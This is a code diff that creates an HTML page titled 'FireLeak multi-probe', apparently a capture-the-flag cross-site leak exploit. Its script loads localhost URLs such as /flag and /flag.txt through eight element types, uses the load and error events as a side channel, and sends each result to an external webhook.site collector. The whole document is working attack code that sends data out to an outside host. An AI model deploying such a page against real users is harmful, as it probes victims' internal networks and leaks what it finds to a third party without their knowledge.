@@ -1,22 +1,59 @@
+<!doctype html>
+<html>
+<body>
+<h1>FireLeak multi-probe</h1>
+
 <script>
-function probe(tag, attr) {
-  const el = document.createElement(tag);
+const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";
 
-  el.onload = () => {
-    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?tag=" + tag + "&event=load");
-  };
-  el.onerror = () => {
-    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?tag=" + tag + "&event=error");
-  };
+const urls = [
+  "http://127.0.0.1/",
+  "http://127.0.0.1/flag",
+  "http://127.0.0.1/flag/",
+  "http://127.0.0.1/flag.txt",
+  "http://127.0.0.1/doesnotexist",
+];
 
-  el[attr] = "http://127.0.0.1/flag?cb=" + Math.random();
-  document.body.appendChild(el);
+const probes = [
+  { tag: "img",    attr: "src"  },
+  { tag: "script", attr: "src"  },
+  { tag: "link",   attr: "href" },
+  { tag: "iframe", attr: "src"  },
+  { tag: "video",  attr: "src"  },
+  { tag: "audio",  attr: "src"  },
+  { tag: "object", attr: "data" },
+  { tag: "embed",  attr: "src"  },
+];
+
+function log(tag, url, ev) {
+  fetch(`${endpoint}?tag=${encodeURIComponent(tag)}&url=${encodeURIComponent(url)}&event=${encodeURIComponent(ev)}`)
+    .catch(() => {});
 }
 
-probe("img", "src");
-probe("script", "src");
-probe("link", "href");
-probe("iframe", "src");
-probe("video", "src");
-probe("audio", "src");
+function probeUrl(url) {
+  for (const p of probes) {
+    try {
+      const el = document.createElement(p.tag);
+
+      el.onload = () => log(p.tag, url, "load");
+      el.onerror = () => log(p.tag, url, "error");
+
+      if (p.tag === "link") {
+        el.rel = "stylesheet";
+      }
+
+      el[p.attr] = url + "?cb=" + Math.random();
+      document.body.appendChild(el);
+    } catch (e) {
+      log(p.tag, url, "exception");
+    }
+  }
+}
+
+for (const u of urls) {
+  probeUrl(u);
+}
 </script>
+
+</body>
+</html>
